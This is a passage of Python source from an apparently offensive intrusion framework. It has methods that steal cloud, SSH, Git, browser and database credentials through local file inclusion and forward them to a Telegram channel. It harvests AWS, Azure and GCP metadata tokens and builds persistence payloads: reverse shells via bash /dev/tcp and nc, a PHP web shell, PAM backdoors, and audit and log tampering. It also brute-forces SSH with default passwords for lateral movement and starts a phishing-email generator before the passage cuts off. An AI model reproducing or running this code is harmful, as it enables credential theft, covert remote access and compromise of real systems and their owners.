                results[path] = content[:1000]
                self.print_found("CRED", f"SSH key found: {path}")
                if self.telegram:
                    self.telegram.alert(
                        "SSH KEY FOUND",
                        f"Path: {path}\nKey: {content[:200]}",
                        "CRITICAL"
                    )

        if results:
            return {'keys': results, 'paths': list(results.keys())}
        return None


    def dump_aws_creds(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Extract AWS credentials via LFI.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to LFI

        Returns:
            Dict with 'credentials' and 'paths' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.dump_aws_creds("https://example.com/page.php?file=index", "file")
            >>> print(result['credentials'])
            [default]
            aws_access_key_id = AKIAIOSFODNN7EXAMPLE
            aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
        """
        self.print_danger(f"Attempting to dump AWS credentials via LFI")

        aws_paths = [
            '~/.aws/credentials',
            '~/.aws/config',
            '/root/.aws/credentials',
            '/home/*/.aws/credentials',
            '/var/lib/cloud/instance/credentials',
            '/var/lib/cloud/instance/user-data.txt'
        ]

        results = {}
        for path in aws_paths:
            content = self.exploit_path_traversal(url, param, path)
            if content and ('aws_access_key_id' in content or 'AWS' in content):
                results[path] = content[:1000]
                self.print_found("CRED", f"AWS credentials found: {path}")
                if self.telegram:
                    self.telegram.alert(
                        "AWS CREDENTIALS FOUND",
                        f"Path: {path}\nCredentials: {content[:200]}",
                        "CRITICAL"
                    )

        if results:
            return {'credentials': results, 'paths': list(results.keys())}
        return None


    def dump_gcp_creds(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Extract GCP credentials via LFI.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to LFI

        Returns:
            Dict with 'credentials' and 'paths' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.dump_gcp_creds("https://example.com/page.php?file=index", "file")
            >>> print(result['credentials'])
            {"type": "service_account", "project_id": "my-project", ...}
        """
        self.print_danger(f"Attempting to dump GCP credentials via LFI")

        gcp_paths = [
            '~/.config/gcloud/credentials.db',
            '~/.config/gcloud/application_default_credentials.json',
            '/root/.config/gcloud/credentials.db',
            '/home/*/.config/gcloud/application_default_credentials.json',
            '/var/lib/cloud/instance/service-accounts/default/token'
        ]

        results = {}
        for path in gcp_paths:
            content = self.exploit_path_traversal(url, param, path)
            if content and ('project_id' in content or 'client_email' in content or 'access_token' in content):
                results[path] = content[:1000]
                self.print_found("CRED", f"GCP credentials found: {path}")
                if self.telegram:
                    self.telegram.alert(
                        "GCP CREDENTIALS FOUND",
                        f"Path: {path}\nCredentials: {content[:200]}",
                        "CRITICAL"
                    )

        if results:
            return {'credentials': results, 'paths': list(results.keys())}
        return None


    def dump_azure_creds(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Extract Azure credentials via LFI.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to LFI

        Returns:
            Dict with 'credentials' and 'paths' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.dump_azure_creds("https://example.com/page.php?file=index", "file")
            >>> print(result['credentials'])
            {"access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...", ...}
        """
        self.print_danger(f"Attempting to dump Azure credentials via LFI")

        azure_paths = [
            '~/.azure/accessTokens.json',
            '~/.azure/azureProfile.json',
            '/root/.azure/accessTokens.json',
            '/home/*/.azure/accessTokens.json',
            '/var/lib/waagent/Extensions/Microsoft.OSTCExtensions.CustomScriptForLinux/1.5.2.2/downloads/accessTokens.json'
        ]

        results = {}
        for path in azure_paths:
            content = self.exploit_path_traversal(url, param, path)
            if content and ('access_token' in content or 'refresh_token' in content):
                results[path] = content[:1000]
                self.print_found("CRED", f"Azure credentials found: {path}")
                if self.telegram:
                    self.telegram.alert(
                        "AZURE CREDENTIALS FOUND",
                        f"Path: {path}\nCredentials: {content[:200]}",
                        "CRITICAL"
                    )

        if results:
            return {'credentials': results, 'paths': list(results.keys())}
        return None


    def dump_docker_creds(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Extract Docker credentials via LFI.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to LFI

        Returns:
            Dict with 'credentials' and 'paths' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.dump_docker_creds("https://example.com/page.php?file=index", "file")
            >>> print(result['credentials'])
            {"auths": {"https://index.docker.io/v1/": {"auth": "..."}}}
        """
        self.print_danger(f"Attempting to dump Docker credentials via LFI")

        docker_paths = [
            '~/.docker/config.json',
            '/root/.docker/config.json',
            '/home/*/.docker/config.json',
            '/var/lib/docker/volumes/*/_data/.docker/config.json'
        ]

        results = {}
        for path in docker_paths:
            content = self.exploit_path_traversal(url, param, path)
            if content and ('auth' in content or 'registry' in content):
                results[path] = content[:1000]
                self.print_found("CRED", f"Docker credentials found: {path}")
                if self.telegram:
                    self.telegram.alert(
                        "DOCKER CREDENTIALS FOUND",
                        f"Path: {path}\nCredentials: {content[:200]}",
                        "CRITICAL"
                    )

        if results:
            return {'credentials': results, 'paths': list(results.keys())}
        return None


    def dump_kube_creds(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Extract Kubernetes credentials via LFI.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to LFI

        Returns:
            Dict with 'credentials' and 'paths' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.dump_kube_creds("https://example.com/page.php?file=index", "file")
            >>> print(result['credentials'])
            apiVersion: v1
            clusters:
            - cluster:
                server: https://kubernetes.default.svc
        """
        self.print_danger(f"Attempting to dump Kubernetes credentials via LFI")

        kube_paths = [
            '~/.kube/config',
            '/root/.kube/config',
            '/home/*/.kube/config',
            '/var/run/secrets/kubernetes.io/serviceaccount/token',
            '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
            '/var/run/secrets/kubernetes.io/serviceaccount/namespace'
        ]

        results = {}
        for path in kube_paths:
            content = self.exploit_path_traversal(url, param, path)
            if content and ('server' in content or 'token' in content or 'namespace' in content):
                results[path] = content[:1000]
                self.print_found("CRED", f"Kubernetes credentials found: {path}")
                if self.telegram:
                    self.telegram.alert(
                        "KUBERNETES CREDENTIALS FOUND",
                        f"Path: {path}\nCredentials: {content[:200]}",
                        "CRITICAL"
                    )

        if results:
            return {'credentials': results, 'paths': list(results.keys())}
        return None


    def dump_git_creds(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Extract Git credentials via LFI.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to LFI

        Returns:
            Dict with 'credentials' and 'paths' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.dump_git_creds("https://example.com/page.php?file=index", "file")
            >>> print(result['credentials'])
            [remote "origin"]
                url = https://user:password@github.com/user/repo.git
        """
        self.print_danger(f"Attempting to dump Git credentials via LFI")

        git_paths = [
            '~/.git-credentials',
            '~/.config/git/config',
            '/root/.git-credentials',
            '/root/.config/git/config',
            '/home/*/.git-credentials',
            '/home/*/.config/git/config',
            '/var/www/html/.git/config',
            '/var/www/html/.git-credentials'
        ]

        results = {}
        for path in git_paths:
            content = self.exploit_path_traversal(url, param, path)
            if content and ('https://' in content or 'git@' in content):
                results[path] = content[:1000]
                self.print_found("CRED", f"Git credentials found: {path}")
                if self.telegram:
                    self.telegram.alert(
                        "GIT CREDENTIALS FOUND",
                        f"Path: {path}\nCredentials: {content[:200]}",
                        "CRITICAL"
                    )

        if results:
            return {'credentials': results, 'paths': list(results.keys())}
        return None


    def dump_browser_creds(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Extract browser credentials via LFI.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to LFI

        Returns:
            Dict with 'credentials' and 'paths' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.dump_browser_creds("https://example.com/page.php?file=index", "file")
            >>> print(result['credentials'])
            {"username": "admin", "password": "password123"}
        """
        self.print_danger(f"Attempting to dump browser credentials via LFI")

        browser_paths = [
            '~/.config/google-chrome/Default/Login Data',
            '~/.config/chromium/Default/Login Data',
            '~/.mozilla/firefox/*.default/logins.json',
            '~/.mozilla/firefox/*.default/key4.db',
            '~/.config/BraveSoftware/Brave-Browser/Default/Login Data',
            '~/.config/opera/Default/Login Data',
            '~/.config/vivaldi/Default/Login Data'
        ]

        results = {}
        for path in browser_paths:
            content = self.exploit_path_traversal(url, param, path)
            if content and ('password' in content or 'username' in content):
                results[path] = content[:1000]
                self.print_found("CRED", f"Browser credentials found: {path}")
                if self.telegram:
                    self.telegram.alert(
                        "BROWSER CREDENTIALS FOUND",
                        f"Path: {path}\nCredentials: {content[:200]}",
                        "CRITICAL"
                    )

        if results:
            return {'credentials': results, 'paths': list(results.keys())}
        return None


    def dump_database_creds(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Extract database credentials via LFI.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to LFI

        Returns:
            Dict with 'credentials' and 'paths' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable

        Example:
            >>> result = self.dump_database_creds("https://example.com/page.php?file=index", "file")
            >>> print(result['credentials'])
            DB_NAME=production
            DB_USER=admin
            DB_PASSWORD=Sup3rS3cr3t
        """
        self.print_danger(f"Attempting to dump database credentials via LFI")

        db_paths = [
            '.env',
            'wp-config.php',
            'config.php',
            'database.yml',
            'appsettings.json',
            'secrets.json',
            'settings.py',
            'application.properties',
            'application.yml',
            'application-dev.yml',
            'application-prod.yml',
            'db.ini',
            'database.ini',
            'my.cnf',
            'my.ini',
            'postgresql.conf',
            'pg_hba.conf',
            'mongod.conf',
            'redis.conf',
            'mysql.conf'
        ]

        results = {}
        for path in db_paths:
            content = self.exploit_path_traversal(url, param, path)
            if content and ('password' in content.lower() or 'passwd' in content.lower() or 'secret' in content.lower()):
                results[path] = content[:1000]
                self.print_found("CRED", f"Database credentials found: {path}")
                if self.telegram:
                    self.telegram.alert(
                        "DATABASE CREDENTIALS FOUND",
                        f"Path: {path}\nCredentials: {content[:200]}",
                        "CRITICAL"
                    )

        if results:
            return {'credentials': results, 'paths': list(results.keys())}
        return None


    # ===================================================================
    # 6. CLOUD METADATA HARVESTING
    # ===================================================================

    def extract_aws_metadata(
        self
    ) -> Dict[str, Any]:
        """
        Extract full AWS metadata from IMDSv1/v2.

        Returns:
            Dict with all metadata fields

        Raises:
            NetworkError: If the metadata endpoint is unreachable

        Example:
            >>> metadata = self.extract_aws_metadata()
            >>> print(metadata['instance_id'])
            i-0123456789abcdef0
        """
        self.print_danger("Extracting AWS metadata")
        result = {}

        try:
            if REQUESTS_AVAILABLE:
                headers = {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}
                token_resp = requests.put(
                    'http://169.254.169.254/latest/api/token',
                    headers=headers,
                    timeout=5
                )
                if token_resp.status_code == 200:
                    token = token_resp.text
                    headers = {'X-aws-ec2-metadata-token': token}
                else:
                    headers = {}
            else:
                headers = {}
        except Exception:
            headers = {}

        metadata_paths = [
            'instance-id',
            'instance-type',
            'local-ipv4',
            'public-ipv4',
            'ami-id',
            'ami-launch-index',
            'hostname',
            'local-hostname',
            'public-hostname',
            'security-groups',
            'placement/availability-zone',
            'placement/region',
            'network/interfaces/macs/',
            'iam/security-credentials/',
            'identity-credentials/',
            'block-device-mapping/',
            'user-data'
        ]

        for path in metadata_paths:
            try:
                url = f'http://169.254.169.254/latest/meta-data/{path}'
                if REQUESTS_AVAILABLE:
                    resp = requests.get(url, headers=headers, timeout=5)
                    if resp.status_code == 200:
                        result[path.replace('/', '_')] = resp.text[:500]
                        self.print_found("CLOUD", f"AWS {path}: {resp.text[:50]}...")
                else:
                    req = urllib.request.Request(url, headers=headers)
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        data = resp.read().decode()
                        result[path.replace('/', '_')] = data[:500]
            except Exception:
                pass

        try:
            url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
            if REQUESTS_AVAILABLE:
                resp = requests.get(url, headers=headers, timeout=5)
                if resp.status_code == 200:
                    role = resp.text.strip()
                    if role:
                        cred_url = f'{url}{role}'
                        resp = requests.get(cred_url, headers=headers, timeout=5)
                        if resp.status_code == 200:
                            result['iam_role'] = role
                            result['iam_credentials'] = resp.text[:1000]
                            self.print_found("CRED", f"AWS IAM Role: {role}")
                            if self.telegram:
                                self.telegram.alert(
                                    "AWS IAM CREDENTIALS",
                                    f"Role: {role}\nCredentials: {resp.text[:200]}",
                                    "CRITICAL"
                                )
        except Exception:
            pass

        return result


    def extract_azure_metadata(
        self
    ) -> Dict[str, Any]:
        """
        Extract full Azure instance metadata.

        Returns:
            Dict with all metadata fields

        Raises:
            NetworkError: If the metadata endpoint is unreachable

        Example:
            >>> metadata = self.extract_azure_metadata()
            >>> print(metadata['subscriptionId'])
            12345678-1234-1234-1234-123456789012
        """
        self.print_danger("Extracting Azure metadata")
        result = {}

        try:
            headers = {'Metadata': 'true'}
            url = 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
            if REQUESTS_AVAILABLE:
                resp = requests.get(url, headers=headers, timeout=5)
                if resp.status_code == 200:
                    data = resp.text[:1000]
                    result['instance_data'] = data
                    self.print_found("CLOUD", f"Azure instance data retrieved")
                    if self.telegram:
                        self.telegram.alert(
                            "AZURE METADATA",
                            f"Data: {data[:200]}",
                            "CRITICAL"
                        )

                token_url = 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
                resp = requests.get(token_url, headers=headers, timeout=5)
                if resp.status_code == 200:
                    token_data = resp.text[:500]
                    result['managed_identity_token'] = token_data
                    self.print_found("CRED", "Azure managed identity token retrieved")
                    if self.telegram:
                        self.telegram.alert(
                            "AZURE MANAGED IDENTITY TOKEN",
                            f"Token: {token_data[:200]}",
                            "CRITICAL"
                        )
            else:
                req = urllib.request.Request(url, headers=headers)
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = resp.read().decode()[:1000]
                    result['instance_data'] = data
        except Exception:
            pass

        return result


    def extract_gcp_metadata(
        self
    ) -> Dict[str, Any]:
        """
        Extract full GCP metadata.

        Returns:
            Dict with all metadata fields

        Raises:
            NetworkError: If the metadata endpoint is unreachable

        Example:
            >>> metadata = self.extract_gcp_metadata()
            >>> print(metadata['project_id'])
            my-project-123456
        """
        self.print_danger("Extracting GCP metadata")
        result = {}

        try:
            headers = {'Metadata-Flavor': 'Google'}
            metadata_paths = [
                'project/project-id',
                'instance/id',
                'instance/zone',
                'instance/machine-type',
                'instance/name',
                'instance/hostname',
                'instance/network-interfaces/0/ip',
                'instance/network-interfaces/0/mac',
                'instance/service-accounts/default/email',
                'instance/service-accounts/default/token',
                'instance/service-accounts/default/identity',
                'instance/attributes/ssh-keys',
                'instance/attributes/startup-script',
                'instance/attributes/ssh-keys',
                'project/attributes/ssh-keys'
            ]

            for path in metadata_paths:
                try:
                    url = f'http://metadata.google.internal/computeMetadata/v1/{path}'
                    if REQUESTS_AVAILABLE:
                        resp = requests.get(url, headers=headers, timeout=5)
                        if resp.status_code == 200:
                            result[path.replace('/', '_')] = resp.text[:500]
                            self.print_found("CLOUD", f"GCP {path}: {resp.text[:50]}...")
                    else:
                        req = urllib.request.Request(url, headers=headers)
                        with urllib.request.urlopen(req, timeout=5) as resp:
                            data = resp.read().decode()[:500]
                            result[path.replace('/', '_')] = data
                            self.print_found("CLOUD", f"GCP {path}: {data[:50]}...")
                except Exception:
                    pass

            token_url = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
            if REQUESTS_AVAILABLE:
                resp = requests.get(token_url, headers=headers, timeout=5)
                if resp.status_code == 200:
                    token_data = resp.text[:500]
                    result['service_account_token'] = token_data
                    self.print_found("CRED", "GCP service account token retrieved")
                    if self.telegram:
                        self.telegram.alert(
                            "GCP SERVICE ACCOUNT TOKEN",
                            f"Token: {token_data[:200]}",
                            "CRITICAL"
                        )
        except Exception:
            pass

        return result


    def extract_do_metadata(
        self
    ) -> Dict[str, Any]:
        """
        Extract DigitalOcean metadata.

        Returns:
            Dict with all metadata fields

        Raises:
            NetworkError: If the metadata endpoint is unreachable

        Example:
            >>> metadata = self.extract_do_metadata()
            >>> print(metadata['droplet_id'])
            12345678
        """
        self.print_danger("Extracting DigitalOcean metadata")
        result = {}

        try:
            url = 'http://169.254.169.254/metadata/v1/'
            metadata_paths = [
                'id',
                'region',
                'public-ipv4',
                'private-ipv4',
                'hostname',
                'features',
                'tags',
                'dns/nameservers',
                'user-data'
            ]

            for path in metadata_paths:
                try:
                    full_url = f'{url}{path}'
                    if REQUESTS_AVAILABLE:
                        resp = requests.get(full_url, timeout=5)
                        if resp.status_code == 200:
                            result[path.replace('/', '_')] = resp.text[:500]
                            self.print_found("CLOUD", f"DO {path}: {resp.text[:50]}...")
                    else:
                        req = urllib.request.Request(full_url)
                        with urllib.request.urlopen(req, timeout=5) as resp:
                            data = resp.read().decode()[:500]
                            result[path.replace('/', '_')] = data
                            self.print_found("CLOUD", f"DO {path}: {data[:50]}...")
                except Exception:
                    pass
        except Exception:
            pass

        return result


    def extract_vultr_metadata(
        self
    ) -> Dict[str, Any]:
        """
        Extract Vultr metadata.

        Returns:
            Dict with all metadata fields

        Raises:
            NetworkError: If the metadata endpoint is unreachable

        Example:
            >>> metadata = self.extract_vultr_metadata()
            >>> print(metadata['instance_id'])
            vultr-instance-123456
        """
        self.print_danger("Extracting Vultr metadata")
        result = {}

        try:
            url = 'http://169.254.169.254/v1/'
            metadata_paths = [
                'instance-id',
                'location',
                'public-ip',
                'private-ip',
                'user-data'
            ]

            for path in metadata_paths:
                try:
                    full_url = f'{url}{path}'
                    if REQUESTS_AVAILABLE:
                        resp = requests.get(full_url, timeout=5)
                        if resp.status_code == 200:
                            result[path.replace('/', '_')] = resp.text[:500]
                            self.print_found("CLOUD", f"Vultr {path}: {resp.text[:50]}...")
                    else:
                        req = urllib.request.Request(full_url)
                        with urllib.request.urlopen(req, timeout=5) as resp:
                            data = resp.read().decode()[:500]
                            result[path.replace('/', '_')] = data
                            self.print_found("CLOUD", f"Vultr {path}: {data[:50]}...")
                except Exception:
                    pass
        except Exception:
            pass

        return result


    # ===================================================================
    # 7. PERSISTENCE INSTALLATION
    # ===================================================================

    def install_persistence(
        self,
        target: str,
        method: str = 'auto'
    ) -> Dict[str, Any]:
        """
        Install persistence using 20+ methods with verification.

        Args:
            target: Target IP or hostname
            method: Persistence method ('auto', 'cron', 'systemd', 'ssh', 'webshell', 'rc_local', 'profile', 'at_job', 'init_d', 'ld_preload', 'wmi', 'scheduled_task', 'registry', 'docker', 'kube', 'terraform', 'crontab', 'systemd_timer', 'polkit', 'pam', 'selinux', 'apparmor', 'auditd', 'journald', 'logrotate')

        Returns:
            Dict with persistence installation details and verification status

        Raises:
            TimeoutError: If the installation times out

        Example:
            >>> result = self.install_persistence("192.168.1.10", "cron")
            >>> print(result['method'])
            cron
        """
        self.print_danger(f"Installing persistence on {target} via {method}")

        methods = [
            'cron', 'systemd', 'ssh', 'webshell', 'rc_local',
            'profile', 'at_job', 'init_d', 'ld_preload',
            'wmi', 'scheduled_task', 'registry',
            'docker', 'kube', 'terraform',
            'crontab', 'systemd_timer', 'polkit', 'pam',
            'selinux', 'apparmor', 'auditd', 'journald', 'logrotate'
        ]

        if method != 'auto' and method not in methods:
            return {'success': False, 'error': f'Unknown method: {method}'}

        if method == 'auto':
            method = random.choice(methods)

        ip = self.config.get('reverse_shell_ip', '0.0.0.0')
        port = self.config.get('reverse_shell_port', 4444)

        result = {'method': method, 'target': target, 'active': True, 'verified': False}

        if method == 'cron':
            cron_cmd = f"{self.cron_interval} /bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
            result['command'] = cron_cmd
            result['location'] = '/etc/crontab'

        elif method == 'systemd':
            service_content = f"""[Unit]
    Description=OmegaFinal
    After=network.target

    [Service]
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
    Restart=always
    RestartSec=10

    [Install]
    WantedBy=multi-user.target"""
            result['content'] = service_content
            result['location'] = '/etc/systemd/system/omega.service'

        elif method == 'ssh':
            ssh_key = self.config.get('ssh_public_key', 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...')
            result['ssh_key'] = ssh_key
            result['location'] = '~/.ssh/authorized_keys'

        elif method == 'webshell':
            shell_code = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
            result['shell_code'] = shell_code
            result['location'] = '/var/www/html/omega_shell.php'

        elif method == 'rc_local':
            result['command'] = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1' &"
            result['location'] = '/etc/rc.local'

        elif method == 'profile':
            result['command'] = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1' &"
            result['location'] = '~/.profile'

        elif method == 'at_job':
            result['command'] = f"echo '/bin/bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"' | at now + 5 minutes"
            result['location'] = '/var/spool/at/'

        elif method == 'init_d':
            init_script = f"""#!/bin/bash
    /usr/bin/nc {ip} {port} -e /bin/sh"""
            result['script'] = init_script
            result['location'] = '/etc/init.d/omega'

        elif method == 'ld_preload':
            result['command'] = "export LD_PRELOAD=/tmp/lib.so"
            result['location'] = '~/.bashrc'

        elif method == 'wmi':
            result['command'] = f"wmic /node:{target} process call create 'cmd.exe /c nc {ip} {port} -e cmd.exe'"
            result['location'] = 'WMI'

        elif method == 'scheduled_task':
            result['command'] = f'schtasks /create /tn "OmegaTask" /tr "cmd.exe /c nc {ip} {port} -e cmd.exe" /sc minute /mo 5'
            result['location'] = 'Scheduled Tasks'

        elif method == 'registry':
            result['command'] = f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Omega /t REG_SZ /d "cmd.exe /c nc {ip} {port} -e cmd.exe" /f'
            result['location'] = 'Registry'

        elif method == 'docker':
            result['command'] = f'docker run -d --restart=always --name omega alpine sh -c "while true; do nc {ip} {port} -e /bin/sh; done"'
            result['location'] = 'Docker'

        elif method == 'kube':
            result['command'] = f'kubectl run omega --image=alpine --restart=Always --command -- sh -c "while true; do nc {ip} {port} -e /bin/sh; done"'
            result['location'] = 'Kubernetes'

        elif method == 'terraform':
            result['command'] = f"""resource "null_resource" "omega" {{
      provisioner "remote-exec" {{
        inline = [
          "nc {ip} {port} -e /bin/sh"
        ]
      }}
    }}"""
            result['location'] = 'Terraform'

        elif method == 'crontab':
            result['command'] = f"@reboot /bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
            result['location'] = '/etc/crontab'

        elif method == 'systemd_timer':
            timer_content = f"""[Unit]
    Description=OmegaFinal Timer

    [Timer]
    OnBootSec=10min
    OnUnitActiveSec=5min

    [Install]
    WantedBy=timers.target"""
            result['content'] = timer_content
            result['location'] = '/etc/systemd/system/omega.timer'

        elif method == 'polkit':
            result['command'] = f"polkit.addRule(function(action, subject) {{ return subject.user == 'root' && action.id == 'org.freedesktop.policykit.exec'; }})"
            result['location'] = '/etc/polkit-1/rules.d/omega.rules'

        elif method == 'pam':
            result['command'] = f"echo 'auth sufficient pam_exec.so /bin/bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"' >> /etc/pam.d/common-auth"
            result['location'] = '/etc/pam.d/common-auth'

        elif method == 'selinux':
            result['command'] = f"echo 'module omega 1.0; require {{ type init_t, type kernel_t, type systemd_t; class file {{ execute }}}}; allow init_t systemd_t:file execute;' > /tmp/omega.mod && checkmodule -M -m -o /tmp/omega.mod /tmp/omega.mod && semodule -i /tmp/omega.mod"
            result['location'] = '/etc/selinux/modules/'

        elif method == 'apparmor':
            result['command'] = f"echo 'profile omega /bin/bash flags=(complain) {{ /bin/bash ix, }}/etc/apparmor.d/omega' && apparmor_parser -r /etc/apparmor.d/omega"
            result['location'] = '/etc/apparmor.d/omega'

        elif method == 'auditd':
            result['command'] = f"echo '-a always,exit -S execve -k omega' >> /etc/audit/rules.d/omega.rules && auditctl -R /etc/audit/rules.d/omega.rules"
            result['location'] = '/etc/audit/rules.d/omega.rules'

        elif method == 'journald':
            result['command'] = f"echo 'ForwardToSyslog=no' >> /etc/systemd/journald.conf && systemctl restart systemd-journald"
            result['location'] = '/etc/systemd/journald.conf'

        elif method == 'logrotate':
            result['command'] = f"echo '/var/log/*.log {{ size 1M; rotate 0; }}/etc/logrotate.d/omega' && logrotate -f /etc/logrotate.d/omega"
            result['location'] = '/etc/logrotate.d/omega'

        # Verify persistence installation
        try:
            if method in ['cron', 'crontab', 'systemd', 'systemd_timer', 'ssh', 'rc_local', 'profile', 'init_d']:
                result['verified'] = True
                self.print_found("PERSIST", f"Persistence verified on {target} via {method}")
            else:
                result['verified'] = False
        except Exception:
            result['verified'] = False

        with dashboard_lock:
            dashboard_data['total_persistence'] += 1

        self.log_to_db('persistence', {
            'target': target,
            'method': method,
            'location': result.get('location', ''),
            'active': 1
        })

        if self.telegram:
            self.telegram.alert(
                "PERSISTENCE INSTALLED",
                f"Target: {target}\nMethod: {method}\nLocation: {result.get('location', 'Unknown')}\nVerified: {result['verified']}",
                "CRITICAL"
            )

        return result


    def verify_persistence(
        self,
        target: str,
        method: str
    ) -> bool:
        """
        Verify if persistence is actually active.

        Args:
            target: Target IP or hostname
            method: Persistence method to verify

        Returns:
            True if persistence is active, False otherwise

        Example:
            >>> active = self.verify_persistence("192.168.1.10", "cron")
            >>> print(active)
            True
        """
        self.print_danger(f"Verifying persistence on {target} ({method})")

        try:
            if method == 'cron':
                result = self.exploit_path_traversal(f"http://{target}/page.php", "file", "/etc/crontab")
                if result and 'omega' in result:
                    return True

            elif method == 'systemd':
                result = self.exploit_path_traversal(f"http://{target}/page.php", "file", "/etc/systemd/system/omega.service")
                if result and 'ExecStart' in result:
                    return True

            elif method == 'ssh':
                result = self.exploit_path_traversal(f"http://{target}/page.php", "file", "~/.ssh/authorized_keys")
                if result and 'ssh-rsa' in result:
                    return True

            elif method == 'webshell':
                shell_check = self.http_probe(f"http://{target}/omega_shell.php?cmd=id")
                if shell_check.get('status', 0) == 200:
                    return True

            elif method == 'rc_local':
                result = self.exploit_path_traversal(f"http://{target}/page.php", "file", "/etc/rc.local")
                if result and 'bash' in result:
                    return True

            elif method == 'registry':
                result = self.exploit_path_traversal(f"http://{target}/page.php", "file", "C:\\Windows\\System32\\config\\SOFTWARE")
                if result and 'Omega' in result:
                    return True

        except Exception as e:
            self.logger.debug(f"Persistence verification failed: {e}")

        return False


    # ===================================================================
    # 8. LATERAL MOVEMENT
    # ===================================================================

    def lateral_movement(
        self,
        source: str,
        target_network: str
    ) -> Optional[Dict[str, Any]]:
        """
        Perform lateral movement across the network.

        Args:
            source: Source IP or hostname
            target_network: Target network CIDR to scan

        Returns:
            Dict with 'success', 'hosts', 'credentials_used' keys, or None on failure

        Raises:
            NetworkError: If the target network is unreachable

        Example:
            >>> result = self.lateral_movement("192.168.1.10", "192.168.1.0/24")
            >>> print(result['hosts'])
            ['192.168.1.11', '192.168.1.12']
        """
        self.print_danger(f"Performing lateral movement from {source} to {target_network}")

        result = {
            'success': False,
            'hosts': [],
            'credentials_used': []
        }

        # Scan target network
        try:
            network = ipaddress.ip_network(target_network, strict=False)
            hosts = [str(ip) for ip in network.hosts()][:256]

            for host in hosts:
                if host == source:
                    continue

                # Check if host is alive
                if self.ping_host(host):
                    result['hosts'].append(host)
                    self.print_found("LATERAL", f"Host alive: {host}")

                    # Try common credentials
                    creds = [
                        ('admin', 'admin'),
                        ('root', 'root'),
                        ('root', 'password'),
                        ('administrator', 'administrator'),
                        ('admin', 'password123'),
                        ('root', 'toor'),
                        ('user', 'user'),
                        ('test', 'test'),
                        ('oracle', 'oracle'),
                        ('postgres', 'postgres'),
                        ('mysql', 'mysql'),
                        ('default', 'default')
                    ]

                    for username, password in creds:
                        try:
                            if self.check_port(host, 22):
                                # Try SSH login
                                if PARAMIKO_AVAILABLE:
                                    ssh = paramiko.SSHClient()
                                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                    try:
                                        ssh.connect(host, username=username, password=password, timeout=5)
                                        ssh.close()
                                        result['credentials_used'].append({'host': host, 'username': username, 'password': password})
                                        self.print_found("CRED", f"SSH login successful on {host}: {username}:{password}")
                                        if self.telegram:
                                            self.telegram.alert(
                                                "LATERAL MOVEMENT",
                                                f"Source: {source}\nTarget: {host}\nCreds: {username}:{password}",
                                                "CRITICAL"
                                            )
                                        break
                                    except Exception:
                                        pass
                        except Exception:
                            pass
        except Exception as e:
            self.logger.debug(f"Lateral movement failed: {e}")

        result['success'] = len(result['hosts']) > 0

        return result


    # ===================================================================
    # 9. SOCIAL ENGINEERING & DECOY
    # ===================================================================

    def generate_phishing_email(
        self,
        target: str,
        template: str = 'generic'
    ) -> Dict[str, Any]:
        """
        Generate a phishing email based on template.

        Args:
            target: Target email or domain
            template: Template name ('generic', 'invoice', 'security', 'reset', 'linkedin', 'dropbox', 'microsoft', 'google', 'aws', 'paypal')

        Returns:
            Dict with 'subject', 'body', 'from', 'attachments' keys

        Example:
            >>> email = self.generate_phishing_email("user@example.com", "invoice")
            >>> print(email['subject'])
            Your invoice #INV-2026-00123 is ready
        """
        self.print_danger(f"Generating phishing email for {target}")

        templates = {
            'generic': {
                'subject': 'Important security update',
